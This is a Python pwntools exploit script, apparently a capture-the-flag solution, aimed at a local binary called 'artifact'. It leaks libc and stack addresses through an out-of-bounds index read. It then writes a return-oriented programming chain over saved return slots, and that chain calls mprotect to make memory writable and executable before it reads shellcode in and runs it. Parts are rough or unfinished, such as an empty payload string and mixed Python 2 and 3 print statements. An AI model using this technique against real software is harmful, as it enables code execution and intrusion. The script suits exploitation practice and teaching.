from pwn import *
# import fn; from fn import _
import re

context(arch="amd64")

# conn = remote('1.2.3.4', 31337)
if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    exit(0)
else:
    conn = process('./artifact')
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
        gdb.attach(conn)
        sleep(2)

def write_idx(idx, num):
    text = conn.recvuntil('Choice?')
    conn.sendline('2 ' + str(idx) + " " + str(num)) # local testing

def leak_idx(idx):
    text = conn.recvuntil('Choice?')
    conn.sendline('1 ' + str(idx)) # local testing
    conn.recvuntil("Here it is")
    return conn.recvline()

shellcode = shellcraft.write(1, 0x555555757000, 4)
shellcode = asm(shellcode)
shellcode = open("shellcode", "r").read().strip()
print("shellcode: ", repr(shellcode))

# THis is all for my own libc
read_offset = 0xdb6b0
write_offset = 0xdb710
libc_base = 0x7ffff7a3c000

pop_rdi = libc_base + 0x1fc6a
pop_rsi = libc_base + 0x1fc1a
pop_rdx = libc_base + 0x1b92
ret_addr = libc_base + 0x291

read_addr = libc_base + read_offset
write_addr = libc_base + write_offset
mprotect_addr = libc_base + 0xe44c0
fstat_addr = libc_base + 0xdb270

#rop chain!!
payload = ""
payload += str()

print("payload", payload)


libc_leak = leak_idx(203)
libc_leak = libc_leak[2:-1]
print "[-]  libc_leak:", repr(libc_leak)


stack_leak = leak_idx(200)
stack_leak = stack_leak[2:-1]
print "[-] stack_leak:", repr(stack_leak)

write_idx(203, pop_rdi)
write_idx(204, 0x555555756000) # addr
write_idx(205, pop_rsi)
write_idx(206, 0x100) 
write_idx(207, pop_rdx)
write_idx(208, 6) # wx, no r
write_idx(209, mprotect_addr)

# read rop chain
write_idx(210, pop_rdi)
write_idx(211, 0 ) # fd
write_idx(212, pop_rsi)
write_idx(213, 0x555555756000) # buf_addr
write_idx(214, pop_rdx)
write_idx(215, len(shellcode))
write_idx(216, read_addr)
write_idx(217, 0x555555756000)

text = conn.recvuntil('Choice?')
conn.sendline('3')
sleep(1)
conn.sendline(shellcode)


# conn.interactive()

# array is at local_650h so rbp-0x650

"""
GDB Addresses

write to 0x7fffffffd790 + 8*index
  ret to 0x7fffffffdde8 (+203*8)
  rsp is then 0x7fffffffddf0 (+204*8)
  and we want 0 at rsp+0x30? (+210*8?)
"""
